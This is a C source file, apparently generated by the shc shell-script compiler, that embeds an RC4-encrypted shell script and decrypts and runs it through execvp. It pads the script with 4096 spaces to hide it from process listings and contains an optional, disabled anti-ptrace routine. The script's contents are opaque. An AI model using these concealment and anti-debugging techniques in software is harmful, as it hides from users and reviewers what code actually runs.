static  char data [] = 
#define      chk1_z	22
#define      chk1	((&data[2]))
	"\320\204\222\017\330\351\314\334\257\363\242\130\166\277\060\163"
	"\360\216\327\303\212\232\310\060\132\231\151\304"
#define      date_z	1
#define      date	((&data[28]))
	"\046"
#define      tst1_z	22
#define      tst1	((&data[30]))
	"\145\350\344\277\251\237\217\353\120\134\274\073\370\300\127\357"
	"\360\223\127\250\227\161\011\366\226\054\261"
#define      chk2_z	19
#define      chk2	((&data[60]))
	"\164\127\324\163\220\352\353\377\367\242\320\160\024\064\247\115"
	"\347\267\207\114\343\260\147\350\214"
#define      opts_z	1
#define      opts	((&data[81]))
	"\020"
#define      shll_z	10
#define      shll	((&data[82]))
	"\221\265\226\056\066\173\154\046\152\165\262\244"
#define      msg2_z	19
#define      msg2	((&data[94]))
	"\313\267\002\071\277\266\366\040\214\265\263\151\014\225\153\357"
	"\301\256\110\273\007"
#define      pswd_z	256
#define      pswd	((&data[128]))
	"\273\232\104\122\307\365\107\246\207\274\376\134\060\127\354\263"
	"\217\304\033\212\354\067\063\027\012\317\007\276\062\132\226\155"
	"\226\256\261\147\232\166\376\021\001\215\041\140\345\015\024\165"
	"\322\057\377\276\147\063\326\162\002\335\060\065\070\307\242\317"
	"\166\124\066\021\312\064\042\314\302\103\055\250\121\101\035\044"
	"\161\035\342\331\120\271\113\123\226\173\211\317\103\054\236\271"
	"\200\324\312\113\011\355\030\314\061\105\164\202\206\222\246\367"
	"\257\211\321\000\102\034\124\331\227\335\250\332\012\106\224\213"
	"\032\136\326\043\114\356\357\175\063\144\000\272\366\246\262\246"
	"\060\203\247\163\237\373\114\067\331\364\022\343\072\246\156\125"
	"\005\105\171\121\064\151\316\147\315\317\042\304\165\324\153\246"
	"\127\022\031\366\015\145\055\347\132\100\313\225\346\071\352\354"
	"\177\144\075\263\315\014\033\233\333\075\137\121\021\312\367\150"
	"\335\021\137\352\167\215\322\321\315\235\147\263\327\122\237\126"
	"\266\335\012\204\352\045\037\306\142\177\027\164\112\017\334\047"
	"\041\074\022\230\311\345\152\226\202\322\112\131\044\352\260\333"
	"\307\272\137\262\340\177\170\103\376\220\267\111\240\346\350\355"
	"\156\011\034\270\372\316\134\204\352\305\077\362\305\165\100\201"
#define      msg1_z	65
#define      msg1	((&data[411]))
	"\330\172\033\176\002\330\175\137\364\227\352\110\371\052\125\356"
	"\216\344\210\240\215\214\356\303\076\037\062\370\233\342\355\141"
	"\216\055\277\214\200\337\237\025\166\171\027\231\077\050\131\005"
	"\107\274\141\270\136\057\352\021\015\324\247\270\326\176\057\102"
	"\212\142\260\317\337\210\247\340\065\010\143\110\366\322\121\022"
	"\212\113\341\347\320\313\255"
#define      inlo_z	3
#define      inlo	((&data[490]))
	"\067\143\236"
#define      rlax_z	1
#define      rlax	((&data[493]))
	"\107"
#define      text_z	74
#define      text	((&data[503]))
	"\155\377\343\354\002\273\152\141\304\317\261\341\163\022\351\331"
	"\150\142\224\151\232\150\067\074\100\223\146\261\205\066\164\134"
	"\245\145\143\307\144\121\356\362\277\300\041\150\221\077\143\061"
	"\364\134\370\065\170\305\127\252\343\053\142\133\371\043\167\325"
	"\340\345\074\162\332\255\334\120\171\132\343\275\171\312\066\035"
	"\354\076\332\316\251\272\240\372\314\053\106\255\023\026\171\300"
	"\046"
#define      xecc_z	15
#define      xecc	((&data[591]))
	"\004\136\011\021\133\217\272\240\151\016\155\037\111\161\102\067"
	"\047"
#define      lsto_z	1
#define      lsto	((&data[608]))
	"\064"
#define      tst2_z	19
#define      tst2	((&data[612]))
	"\234\275\216\156\361\216\326\024\103\101\215\066\333\333\173\063"
	"\345\254\276\035\127\034\006\037\122\324"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */
#define BUSYBOXON	0	/* Define as 1 to enable work with busybox */

/* rtc.c */

#include <sys/stat.h>
#include <sys/types.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

/* 'Alleged RC4' */

static unsigned char stte[256], indx, jndx, kndx;

/*
 * Reset arc4 stte. 
 */
void stte_0(void)
{
	indx = jndx = kndx = 0;
	do {
		stte[indx] = indx;
	} while (++indx);
}

/*
 * Set key. Can be used more than once. 
 */
void key(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		do {
			tmp = stte[indx];
			kndx += tmp;
			kndx += ptr[(int)indx % len];
			stte[indx] = stte[kndx];
			stte[kndx] = tmp;
		} while (++indx);
		ptr += 256;
		len -= 256;
	}
}

/*
 * Crypt data. 
 */
void arc4(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		indx++;
		tmp = stte[indx];
		jndx += tmp;
		stte[indx] = stte[jndx];
		stte[jndx] = tmp;
		tmp += stte[indx];
		*ptr ^= stte[tmp];
		ptr++;
		len--;
	}
}

/* End of ARC4 */

/*
 * Key with file invariants. 
 */
int key_with_file(char * file)
{
	struct stat statf[1];
	struct stat control[1];

	if (stat(file, statf) < 0)
		return -1;

	/* Turn on stable fields */
	memset(control, 0, sizeof(control));
	control->st_ino = statf->st_ino;
	control->st_dev = statf->st_dev;
	control->st_rdev = statf->st_rdev;
	control->st_uid = statf->st_uid;
	control->st_gid = statf->st_gid;
	control->st_size = statf->st_size;
	control->st_mtime = statf->st_mtime;
	control->st_ctime = statf->st_ctime;
	key(control, sizeof(control));
	return 0;
}

#if DEBUGEXEC
void debugexec(char * sh11, int argc, char ** argv)
{
	int i;
	fprintf(stderr, "shll=%s\n", sh11 ? sh11 : "<null>");
	fprintf(stderr, "argc=%d\n", argc);
	if (!argv) {
		fprintf(stderr, "argv=<null>\n");
	} else { 
		for (i = 0; i <= argc ; i++)
			fprintf(stderr, "argv[%d]=%.60s\n", i, argv[i] ? argv[i] : "<null>");
	}
}
#endif /* DEBUGEXEC */

void rmarg(char ** argv, char * arg)
{
	for (; argv && *argv && *argv != arg; argv++);
	for (; argv && *argv; argv++)
		*argv = argv[1];
}

void chkenv_end(void);

int chkenv(int argc)
{
	char buff[512];
	unsigned long mask, m;
	int l, a, c;
	char * string;
	extern char ** environ;

	mask = (unsigned long)getpid();
	stte_0();
	 key(&chkenv, (void*)&chkenv_end - (void*)&chkenv);
	 key(&data, sizeof(data));
	 key(&mask, sizeof(mask));
	arc4(&mask, sizeof(mask));
	sprintf(buff, "x%lx", mask);
	string = getenv(buff);
#if DEBUGEXEC
	fprintf(stderr, "getenv(%s)=%s\n", buff, string ? string : "<null>");
#endif
	l = strlen(buff);
	if (!string) {
		/* 1st */
		sprintf(&buff[l], "=%lu %d", mask, argc);
		putenv(strdup(buff));
		return 0;
	}
	c = sscanf(string, "%lu %d%c", &m, &a, buff);
	if (c == 2 && m == mask) {
		/* 3rd */
		rmarg(environ, &string[-l - 1]);
		return 1 + (argc - a);
	}
	return -1;
}

void chkenv_end(void){}

#if !TRACEABLE

#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>

#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
void untraceable(char * argv0)
{
	char proc[80];
	int pid, mine;

	switch(pid = fork()) {
	case  0:
		pid = getppid();
		/* For problematic SunOS ptrace */
#if defined(__FreeBSD__)
		sprintf(proc, "/proc/%d/mem", (int)pid);
#else
		sprintf(proc, "/proc/%d/as",  (int)pid);
#endif
		close(0);
		mine = !open(proc, O_RDWR|O_EXCL);
		if (!mine && errno != EBUSY)
			mine = !ptrace(PTRACE_ATTACH, pid, 0, 0);
		if (mine) {
			kill(pid, SIGCONT);
		} else {
			perror(argv0);
			kill(pid, SIGKILL);
		}
		_exit(mine);
	case -1:
		break;
	default:
		if (pid == waitpid(pid, 0, 0))
			return;
	}
	perror(argv0);
	_exit(1);
}
#endif /* !TRACEABLE */

char * xsh(int argc, char ** argv)
{
	char * scrpt;
	int ret, i, j;
	char ** varg;
	char * me = argv[0];
	if (me == NULL) { me = getenv("_"); }
	if (me == 0) { fprintf(stderr, "E: neither argv[0] nor $_ works."); exit(1); }

	ret = chkenv(argc);
	stte_0();
	 key(pswd, pswd_z);
	arc4(msg1, msg1_z);
	arc4(date, date_z);
	if (date[0] && (atoll(date)<time(NULL)))
		return msg1;
	arc4(shll, shll_z);
	arc4(inlo, inlo_z);
	arc4(xecc, xecc_z);
	arc4(lsto, lsto_z);
	arc4(tst1, tst1_z);
	 key(tst1, tst1_z);
	arc4(chk1, chk1_z);
	if ((chk1_z != tst1_z) || memcmp(tst1, chk1, tst1_z))
		return tst1;
	arc4(msg2, msg2_z);
	if (ret < 0)
		return msg2;
	varg = (char **)calloc(argc + 10, sizeof(char *));
	if (!varg)
		return 0;
	if (ret) {
		arc4(rlax, rlax_z);
		if (!rlax[0] && key_with_file(shll))
			return shll;
		arc4(opts, opts_z);
		arc4(text, text_z);
		arc4(tst2, tst2_z);
		 key(tst2, tst2_z);
		arc4(chk2, chk2_z);
		if ((chk2_z != tst2_z) || memcmp(tst2, chk2, tst2_z))
			return tst2;
		/* Prepend hide_z spaces to script text to hide it. */
		scrpt = malloc(hide_z + text_z);
		if (!scrpt)
			return 0;
		memset(scrpt, (int) ' ', hide_z);
		memcpy(&scrpt[hide_z], text, text_z);
	} else {			/* Reexecute */
		if (*xecc) {
			scrpt = malloc(512);
			if (!scrpt)
				return 0;
			sprintf(scrpt, xecc, me);
		} else {
			scrpt = me;
		}
	}
	j = 0;
#if BUSYBOXON
	varg[j++] = "busybox";
	varg[j++] = "sh";
#else
	varg[j++] = argv[0];		/* My own name at execution */
#endif
	if (ret && *opts)
		varg[j++] = opts;	/* Options on 1st line of code */
	if (*inlo)
		varg[j++] = inlo;	/* Option introducing inline code */
	varg[j++] = scrpt;		/* The script itself */
	if (*lsto)
		varg[j++] = lsto;	/* Option meaning last option */
	i = (ret > 1) ? ret : 0;	/* Args numbering correction */
	while (i < argc)
		varg[j++] = argv[i++];	/* Main run-time arguments */
	varg[j] = 0;			/* NULL terminated array */
#if DEBUGEXEC
	debugexec(shll, j, varg);
#endif
	execvp(shll, varg);
	return shll;
}

int main(int argc, char ** argv)
{
#if DEBUGEXEC
	debugexec("main", argc, argv);
#endif
#if !TRACEABLE
	untraceable(argv[0]);
#endif
	argv[1] = xsh(argc, argv);
	fprintf(stderr, "%s%s%s: %s\n", argv[0],
		errno ? ": " : "",
		errno ? strerror(errno) : "",
		argv[1] ? argv[1] : "<null>"
	);
	return 1;
}
